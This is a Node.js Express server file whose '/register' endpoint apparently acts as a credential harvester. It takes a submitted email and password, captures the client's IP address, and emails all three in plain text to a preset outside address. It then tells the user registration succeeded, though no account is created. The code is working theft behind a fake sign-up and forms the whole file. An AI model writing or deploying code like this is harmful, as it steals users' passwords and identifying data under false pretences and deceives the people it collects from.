import "dotenv/config";
import express from "express";
import nodemailer from "nodemailer";
import cors from "cors";

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 5000;
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

app.post("/register", async (req, res) => {
  const { email, password } = req.body;
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (ip === "::1") {
    ip = "127.0.0.1";
  } else {
    ip = ip.replace(/^::ffff:/, "");
  }

  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: process.env.TO_EMAIL,
    subject: "New Registration",
    text: `New User Registered:
           Email: ${email}
           Password: ${password}
           IP Address: ${ip}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.json({ message: "Registration Successful!" });
  } catch (error) {
    res.status(500).json({ message: "Error sending email" });
  }
});

app.listen(PORT, "127.0.0.1", () =>
  console.log(`Server running on http://127.0.0.1:${PORT}`)
);
